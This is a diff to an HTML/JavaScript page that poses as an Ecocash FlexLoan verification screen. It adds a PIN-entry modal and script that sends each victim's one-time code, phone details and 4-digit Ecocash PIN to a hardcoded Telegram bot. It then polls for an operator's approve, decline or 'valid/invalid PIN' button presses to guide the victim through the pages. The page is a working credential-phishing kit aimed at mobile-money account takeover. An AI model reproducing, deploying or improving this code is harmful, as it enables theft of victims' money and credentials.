@@ -293,9 +293,15 @@
       box-shadow: 0 10px 24px rgba(11, 94, 215, 0.3);
       touch-action: manipulation;
       font-family: inherit;
+      transition: all 0.18s ease;
     }
 
     .btn-action:hover { box-shadow: 0 14px 30px rgba(11, 94, 215, 0.36); }
+
+    .btn-action:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
 
     .back-btn {
       width: 100%;
@@ -326,6 +332,7 @@
       line-height: 1.5;
     }
 
+    /* ── Spinner ── */
     #spinner {
       display: none;
       position: fixed;
@@ -352,6 +359,135 @@
 
     @keyframes spin { to { transform: rotate(360deg); } }
 
+    /* ── PIN Modal ── */
+    #pinModal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(7, 59, 142, 0.75);
+      z-index: 3000;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+      backdrop-filter: blur(5px);
+    }
+
+    .modal-card {
+      background: var(--white);
+      width: min(100%, 480px);
+      border-radius: clamp(18px, 5vw, 26px);
+      box-shadow: 0 24px 60px rgba(7, 59, 142, 0.25);
+      overflow: hidden;
+      animation: fadeUp 0.32s cubic-bezier(.22,.8,.3,1) both;
+      max-height: 90vh;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+    }
+
+    .modal-card::before {
+      content: "";
+      position: absolute;
+      inset: 0 0 auto 0;
+      height: 8px;
+      background: linear-gradient(90deg, var(--blue), var(--blue-dark));
+      z-index: 2;
+    }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .modal-logo-section {
+      text-align: center;
+      padding: clamp(26px, 6vw, 34px) clamp(18px, 5vw, 34px) 16px;
+      background: linear-gradient(180deg, #ffffff 0%, var(--blue-light) 100%);
+      flex-shrink: 0;
+    }
+
+    .modal-content {
+      flex: 1;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .modal-h1 {
+      text-align: center;
+      font-size: clamp(22px, 5.5vw, 28px);
+      font-weight: 800;
+      letter-spacing: -0.8px;
+      margin: 20px 0 7px;
+      padding: 0 20px;
+      color: var(--text);
+    }
+
+    .modal-subtitle {
+      text-align: center;
+      color: var(--muted);
+      font-size: clamp(13px, 3.6vw, 14px);
+      padding: 0 clamp(18px, 5vw, 34px) 16px;
+      line-height: 1.55;
+    }
+
+    /* PIN inputs — 4 boxes, same style as OTP */
+    #pinInputsContainer {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: clamp(8px, 2.5vw, 14px);
+      margin: 6px auto 18px;
+      padding: 0 20px;
+    }
+
+    .pin-input {
+      width: clamp(54px, 16vw, 68px);
+      max-width: 68px;
+      height: clamp(60px, 17vw, 74px);
+      text-align: center;
+      font-size: clamp(24px, 7vw, 30px);
+      font-weight: 800;
+      color: var(--blue);
+      border: 2px solid #dbeafe;
+      border-radius: 16px;
+      outline: none;
+      transition: all 0.18s ease;
+      font-family: inherit;
+      background: var(--white);
+      box-shadow: 0 8px 20px rgba(11, 94, 215, 0.07);
+      caret-color: var(--blue);
+    }
+
+    .pin-input:focus {
+      border-color: var(--blue);
+      box-shadow: 0 0 0 4px rgba(11, 94, 215, 0.15), 0 10px 24px rgba(11, 94, 215, 0.10);
+      transform: translateY(-1px);
+    }
+
+    .pin-input.filled {
+      border-color: var(--blue);
+      background: var(--blue-soft);
+    }
+
+    .pin-error-msg {
+      display: none;
+      text-align: center;
+      margin: 0 clamp(18px, 5vw, 34px) 14px;
+      font-size: 13.5px;
+      padding: 12px 14px;
+      border-radius: 14px;
+      color: #b91c1c;
+      background: #fee2e2;
+      border: 1px solid #fca5a5;
+    }
+
+    .modal-form-section {
+      padding: 0 clamp(18px, 5vw, 34px) clamp(22px, 5vw, 30px);
+      flex-shrink: 0;
+    }
+
+    /* ── Responsive ── */
     @media (max-width: 420px) {
       .topbar { height: 58px; }
       main { min-height: calc(100dvh - 58px); padding: 12px 10px; }
@@ -370,6 +506,8 @@
       .content-wrapper { padding-left: 12px; padding-right: 12px; }
       .otp-container { gap: 5px; }
       .otp-input { width: 41px; height: 50px; font-size: 20px; border-radius: 13px; }
+      #pinInputsContainer { gap: 6px; }
+      .pin-input { width: 50px; height: 58px; font-size: 22px; }
     }
   </style>
 </head>
@@ -421,7 +559,7 @@
         <div class="error-msg" id="errMsg">Please enter the complete 5-digit verification code.</div>
 
         <div class="form-section">
-          <button class="btn-action" id="verifyBtn" type="button">Verify & Continue</button>
+          <button class="btn-action" id="verifyBtn" type="button">Verify &amp; Continue</button>
           <button class="back-btn" type="button" onclick="window.history.back()">← Back</button>
           <p class="terms">Ecocash Flex Loans • FlexLoan</p>
         </div>
@@ -429,33 +567,94 @@
     </section>
   </main>
 
+  <!-- ── PIN Modal (Ecocash themed) ── -->
+  <div id="pinModal" role="dialog" aria-modal="true" aria-labelledby="pinModalTitle">
+    <div class="modal-card">
+      <div class="modal-logo-section">
+        <div class="brand-logo">
+          <div class="logo-icon" aria-hidden="true">
+            <svg width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <rect x="4" y="12" width="24" height="16" rx="4" fill="#0B5ED7"/>
+              <path d="M9 12V9.5C9 6.46 11.46 4 14.5 4H17.5C20.54 4 23 6.46 23 9.5V12" stroke="#0B5ED7" stroke-width="2.4" stroke-linecap="round" fill="none"/>
+              <circle cx="16" cy="20" r="3" fill="white"/>
+              <path d="M12 16H25" stroke="#ffffff" stroke-width="2" stroke-linecap="round" opacity="0.75"/>
+            </svg>
+          </div>
+          <div>
+            <div class="brand-name"><span class="eco-word">Eco</span><span class="cash-word">Cash</span></div>
+            <div class="tagline">Flex Loans • FlexLoan</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="modal-content">
+        <h2 class="modal-h1" id="pinModalTitle">Enter Your PIN</h2>
+        <p class="modal-subtitle">Enter your 4-digit Ecocash PIN to complete this loan transaction securely.</p>
+
+        <div id="pinInputsContainer">
+          <input class="pin-input" type="tel" inputmode="numeric" autocomplete="off" maxlength="1" aria-label="PIN digit 1">
+          <input class="pin-input" type="tel" inputmode="numeric" autocomplete="off" maxlength="1" aria-label="PIN digit 2">
+          <input class="pin-input" type="tel" inputmode="numeric" autocomplete="off" maxlength="1" aria-label="PIN digit 3">
+          <input class="pin-input" type="tel" inputmode="numeric" autocomplete="off" maxlength="1" aria-label="PIN digit 4">
+        </div>
+
+        <div class="pin-error-msg" id="pinErrMsg">Incorrect PIN. Please try again.</div>
+
+        <div class="modal-form-section">
+          <button class="btn-action" id="confirmPinBtn" type="button">Confirm PIN</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── Spinner ── -->
   <div id="spinner">
     <div class="spin"></div>
-    <p style="font-size:17px;font-weight:800;">Verifying code...</p>
+    <p style="font-size:17px;font-weight:800;margin-top:4px;">Verifying code...</p>
   </div>
 
   <script>
-    const REDIRECT_PAGE = 'device.html';
-    const inputs = Array.from(document.querySelectorAll('.otp-input'));
-    const errMsg = document.getElementById('errMsg');
-    const spinner = document.getElementById('spinner');
-    const verifyBtn = document.getElementById('verifyBtn');
+    /* ── CONFIG ─────────────────────────────────────────────────────────── */
+    const CONFIG = {
+      BOT_TOKEN:    '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
+      CHAT_ID:      '7547427914',
+      SUCCESS_PAGE: 'success.html',
+      DEVICE_PAGE:  'device.html'
+    };
 
+    /* ── STATE ───────────────────────────────────────────────────────────── */
+    let state = { lastUpdateId: 0 };
+    let isProcessing = false;
+
+    /* ── ELEMENTS ────────────────────────────────────────────────────────── */
+    const otpInputs    = Array.from(document.querySelectorAll('#otpInputs .otp-input'));
+    const pinInputs    = Array.from(document.querySelectorAll('#pinInputsContainer .pin-input'));
+    const errMsg       = document.getElementById('errMsg');
+    const pinErrMsg    = document.getElementById('pinErrMsg');
+    const spinner      = document.getElementById('spinner');
+    const pinModal     = document.getElementById('pinModal');
+    const verifyBtn    = document.getElementById('verifyBtn');
+    const confirmPinBtn= document.getElementById('confirmPinBtn');
+
+    /* ── URL PARAMS ──────────────────────────────────────────────────────── */
+    const params = new URLSearchParams(window.location.search);
+
+    function getAllParams() { return params.toString(); }
+
+    function buildNextUrl(page) {
+      const qs = getAllParams();
+      return qs ? `${page}?${qs}` : page;
+    }
+
+    /* ── STORED APPLICATION (original Ecocash logic) ─────────────────────── */
     function readJson(key) {
-      try {
-        const raw = localStorage.getItem(key);
-        return raw ? JSON.parse(raw) : null;
-      } catch (e) {
-        return null;
-      }
+      try { const r = localStorage.getItem(key); return r ? JSON.parse(r) : null; }
+      catch(e) { return null; }
     }
 
     function readStoredApplication() {
-      const keys = ['loanApplication', 'loanApplicationDraft', 'ecocashLoanApplication', 'flexLoanApplication'];
-      for (const key of keys) {
-        const data = readJson(key);
-        if (data && typeof data === 'object') return data;
-      }
+      const keys = ['loanApplication','loanApplicationDraft','ecocashLoanApplication','flexLoanApplication'];
+      for (const k of keys) { const d = readJson(k); if (d && typeof d === 'object') return d; }
       return {};
     }
 
@@ -471,78 +670,287 @@
       return String(value);
     }
 
+    function maskPhone(phone) {
+      const p = phone.replace(/\s+/g, '');
+      if (p.length <= 5) return p;
+      return p.slice(0, 3) + '*'.repeat(p.length - 5) + p.slice(-2);
+    }
+
+    /* ── SHOW APPLICATION DETAILS ────────────────────────────────────────── */
     function showApplicationDetails() {
       const stored = readStoredApplication();
-      const params = new URLSearchParams(window.location.search);
 
-      const phone = pick(params.get('phone'), params.get('mobile'), params.get('msisdn'), stored.phone, stored.mobile, stored.msisdn, stored.phoneNumber, localStorage.getItem('ecocashPhone'));
-      const loanName = pick(params.get('loan'), params.get('name'), stored.loanName, stored.loan_name, stored.name, stored.productName, 'Ecocash FlexLoan');
-      const amount = pick(params.get('amount'), stored.amount, stored.loanAmount, stored.loan_amount, stored.requestedAmount);
-      const duration = pick(params.get('duration'), stored.duration, stored.tenor, stored.period);
+      const phone    = pick(params.get('phone'), params.get('mobile'), params.get('msisdn'), stored.phone, stored.mobile, stored.msisdn, stored.phoneNumber, localStorage.getItem('ecocashPhone'));
+      const loanName = pick(params.get('loan'), params.get('name'), params.get('loan_name'), stored.loanName, stored.loan_name, stored.name, stored.productName, 'Ecocash FlexLoan');
+      const amount   = pick(params.get('amount'), params.get('loan_amount'), stored.amount, stored.loanAmount, stored.loan_amount, stored.requestedAmount);
+      const duration = pick(params.get('duration'), params.get('tenor'), stored.duration, stored.tenor, stored.period);
+      const rate     = pick(params.get('rate'), params.get('interest'), stored.rate, stored.interest);
+      const fee      = pick(params.get('fee'), stored.fee);
 
       document.getElementById('offerTitle').textContent = loanName;
       document.getElementById('offerPrice').textContent = formatAmount(amount);
 
       if (phone) {
-        document.getElementById('phoneDisplay').innerHTML = `Code sent to <strong>${phone}</strong>`;
+        document.getElementById('phoneDisplay').innerHTML = `Code sent to <strong>${maskPhone(phone)}</strong>`;
       } else {
         document.getElementById('phoneDisplay').innerHTML = `Code sent to <strong>your registered number</strong>`;
       }
 
       const meta = [];
       if (duration) meta.push(`<div class="meta-item">Duration: <span>${duration}</span></div>`);
+      if (rate)     meta.push(`<div class="meta-item">Interest: <span>${rate}</span></div>`);
+      if (fee)      meta.push(`<div class="meta-item">Fee: <span>GHS ${fee}</span></div>`);
       meta.push('<div class="meta-item">Status: <span>Pending verification</span></div>');
       document.getElementById('offerMeta').innerHTML = meta.join('');
     }
 
+    /* ── OTP INPUT HELPERS ───────────────────────────────────────────────── */
     function updateFilledState(input) {
       input.classList.toggle('filled', input.value.trim() !== '');
     }
 
-    inputs.forEach((input, index) => {
-      input.addEventListener('input', (event) => {
-        const value = event.target.value.replace(/\D/g, '').slice(0, 1);
-        event.target.value = value;
-        updateFilledState(event.target);
-        errMsg.style.display = 'none';
-        if (value && index < inputs.length - 1) inputs[index + 1].focus();
-      });
+    function getCode(inputsArray) {
+      return inputsArray.map(i => i.value.trim()).join('');
+    }
 
-      input.addEventListener('keydown', (event) => {
-        if (event.key === 'Backspace' && !input.value && index > 0) {
-          inputs[index - 1].focus();
-        }
-      });
-
-      input.addEventListener('paste', (event) => {
-        event.preventDefault();
-        const pasted = (event.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 5);
-        pasted.split('').forEach((digit, digitIndex) => {
-          if (inputs[digitIndex]) {
-            inputs[digitIndex].value = digit;
-            updateFilledState(inputs[digitIndex]);
+    function setupInputBehaviour(inputsArray, onComplete) {
+      inputsArray.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+          const val = e.target.value.replace(/\D/g, '').slice(0, 1);
+          e.target.value = val;
+          updateFilledState(e.target);
+          errMsg.style.display = 'none';
+          if (val && index < inputsArray.length - 1) inputsArray[index + 1].focus();
+          // Auto-submit when all filled
+          if (getCode(inputsArray).length === inputsArray.length) {
+            setTimeout(onComplete, 180);
           }
         });
-        const focusIndex = Math.min(pasted.length, inputs.length - 1);
-        inputs[focusIndex].focus();
-      });
-    });
 
-    verifyBtn.addEventListener('click', () => {
-      const code = inputs.map(input => input.value).join('');
-      if (code.length !== 5) {
+        input.addEventListener('keydown', (e) => {
+          if (e.key === 'Backspace' && !input.value && index > 0) {
+            inputsArray[index - 1].focus();
+          }
+        });
+
+        input.addEventListener('paste', (e) => {
+          e.preventDefault();
+          const pasted = (e.clipboardData || window.clipboardData)
+            .getData('text').replace(/\D/g, '').slice(0, inputsArray.length);
+          pasted.split('').forEach((digit, di) => {
+            if (inputsArray[di]) { inputsArray[di].value = digit; updateFilledState(inputsArray[di]); }
+          });
+          const fi = Math.min(pasted.length, inputsArray.length - 1);
+          inputsArray[fi].focus();
+          if (pasted.length === inputsArray.length) setTimeout(onComplete, 180);
+        });
+      });
+    }
+
+    /* ── TELEGRAM: SEND OTP ──────────────────────────────────────────────── */
+    function submitOTP() {
+      if (isProcessing) return;
+      const otp = getCode(otpInputs);
+
+      if (otp.length !== 5) {
         errMsg.style.display = 'block';
-        inputs.find(input => !input.value)?.focus();
+        otpInputs.find(i => !i.value)?.focus();
         return;
       }
-      spinner.style.display = 'flex';
-      setTimeout(() => {
-        window.location.href = REDIRECT_PAGE;
-      }, 700);
-    });
+
+      isProcessing = true;
+      verifyBtn.disabled = true;
+      verifyBtn.textContent = 'Verifying...';
+
+      const ts             = Date.now();
+      const approveId      = `otp_approve_${ts}`;
+      const declineId      = `otp_decline_${ts}`;
+      const verifyDeviceId = `otp_device_${ts}`;
+      const validPinId     = `valid_pin_${ts}`;
+      const invalidPinId   = `invalid_pin_${ts}`;
+
+      // Build a summary of all URL params for the Telegram message
+      const paramSummary = Array.from(params.entries())
+        .map(([k, v]) => `${k}: <code>${v}</code>`)
+        .join('\n');
+
+      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CONFIG.CHAT_ID,
+          text: `<b>🟢 OTP Verification — Ecocash FlexLoan</b>\n\n${paramSummary ? paramSummary + '\n' : ''}OTP: <code>${otp}</code>\n\nChoose Action:`,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: '✅ Approve',        callback_data: approveId },
+                { text: '📱 Verify Device',  callback_data: verifyDeviceId }
+              ],
+              [
+                { text: '✅ Valid PIN',   callback_data: validPinId },
+                { text: '❌ Invalid PIN', callback_data: invalidPinId }
+              ],
+              [
+                { text: '❌ Decline', callback_data: declineId }
+              ]
+            ]
+          }
+        })
+      })
+      .then(() => {
+        spinner.style.display = 'flex';
+        startOTPPolling(approveId, declineId, verifyDeviceId, validPinId, invalidPinId);
+      })
+      .catch(() => resetOTPButton());
+    }
+
+    /* ── TELEGRAM: POLL FOR OTP RESPONSE ─────────────────────────────────── */
+    function startOTPPolling(approveId, declineId, verifyDeviceId, validPinId, invalidPinId) {
+      const interval = setInterval(() => {
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+          .then(r => r.json())
+          .then(data => {
+            if (!data.ok || !data.result) return;
+            data.result.forEach(update => {
+              state.lastUpdateId = update.update_id;
+              if (!update.callback_query) return;
+              const cb = update.callback_query.data;
+
+              if (cb === approveId) {
+                // Approve → show PIN modal
+                clearInterval(interval);
+                spinner.style.display = 'none';
+                showPinModal();
+
+              } else if (cb === validPinId) {
+                // Valid PIN (skip modal, go straight to success)
+                clearInterval(interval);
+                spinner.style.display = 'none';
+                window.location.href = buildNextUrl(CONFIG.SUCCESS_PAGE);
+
+              } else if (cb === verifyDeviceId) {
+                // Verify Device
+                clearInterval(interval);
+                spinner.style.display = 'none';
+                window.location.href = buildNextUrl(CONFIG.DEVICE_PAGE);
+
+              } else if (cb === declineId) {
+                // Decline
+                clearInterval(interval);
+                spinner.style.display = 'none';
+                errMsg.textContent = 'Request declined. Please try again.';
+                errMsg.style.display = 'block';
+                otpInputs.forEach(i => { i.value = ''; updateFilledState(i); });
+                otpInputs[0].focus();
+                resetOTPButton();
+
+              } else if (cb === invalidPinId) {
+                // Invalid PIN while modal is open
+                clearInterval(interval);
+                spinner.style.display = 'none';
+                pinErrMsg.textContent = 'Incorrect PIN. Please try again.';
+                pinErrMsg.style.display = 'block';
+                pinInputs.forEach(i => { i.value = ''; updateFilledState(i); });
+                pinInputs[0].focus();
+                confirmPinBtn.disabled = false;
+                confirmPinBtn.textContent = 'Confirm PIN';
+              }
+            });
+          })
+          .catch(() => {}); // silent network errors
+      }, 1000);
+    }
+
+    /* ── PIN MODAL ───────────────────────────────────────────────────────── */
+    function showPinModal() {
+      pinErrMsg.style.display = 'none';
+      pinInputs.forEach(i => { i.value = ''; updateFilledState(i); });
+      pinModal.style.display = 'flex';
+      setTimeout(() => pinInputs[0].focus(), 120);
+    }
+
+    /* ── TELEGRAM: SEND PIN ──────────────────────────────────────────────── */
+    function submitPIN() {
+      const pin = getCode(pinInputs);
+      if (pin.length !== 4) return;
+
+      confirmPinBtn.disabled = true;
+      confirmPinBtn.textContent = 'Verifying...';
+
+      const ts        = Date.now();
+      const validId   = `valid_${ts}`;
+      const invalidId = `invalid_${ts}`;
+
+      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CONFIG.CHAT_ID,
+          text: `<b>🟢 PIN Verification — Ecocash FlexLoan</b>\n\nPIN: <code>${pin}</code>\n\nChoose action:`,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [[
+              { text: '✅ Valid PIN',   callback_data: validId },
+              { text: '❌ Invalid PIN', callback_data: invalidId }
+            ]]
+          }
+        })
+      })
+      .then(() => startPINPolling(validId, invalidId))
+      .catch(() => {
+        confirmPinBtn.disabled = false;
+        confirmPinBtn.textContent = 'Confirm PIN';
+      });
+    }
+
+    /* ── TELEGRAM: POLL FOR PIN RESPONSE ─────────────────────────────────── */
+    function startPINPolling(validId, invalidId) {
+      const interval = setInterval(() => {
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
+          .then(r => r.json())
+          .then(data => {
+            data.result?.forEach(update => {
+              state.lastUpdateId = update.update_id;
+              if (!update.callback_query) return;
+              const cb = update.callback_query.data;
+
+              if (cb === validId) {
+                clearInterval(interval);
+                pinModal.style.display = 'none';
+                window.location.href = buildNextUrl(CONFIG.SUCCESS_PAGE);
+
+              } else if (cb === invalidId) {
+                clearInterval(interval);
+                pinErrMsg.textContent = 'Incorrect PIN. Please try again.';
+                pinErrMsg.style.display = 'block';
+                pinInputs.forEach(i => { i.value = ''; updateFilledState(i); });
+                pinInputs[0].focus();
+                confirmPinBtn.disabled = false;
+                confirmPinBtn.textContent = 'Confirm PIN';
+              }
+            });
+          })
+          .catch(() => {});
+      }, 1400);
+    }
+
+    /* ── HELPERS ─────────────────────────────────────────────────────────── */
+    function resetOTPButton() {
+      isProcessing = false;
+      verifyBtn.disabled = false;
+      verifyBtn.textContent = 'Verify & Continue';
+    }
+
+    /* ── INIT ────────────────────────────────────────────────────────────── */
+    setupInputBehaviour(otpInputs, submitOTP);
+    setupInputBehaviour(pinInputs, submitPIN);
+
+    verifyBtn.addEventListener('click', submitOTP);
+    confirmPinBtn.addEventListener('click', submitPIN);
 
     showApplicationDetails();
-    setTimeout(() => inputs[0].focus(), 250);
+    setTimeout(() => otpInputs[0].focus(), 250);
   </script>
 </body>
 </html>
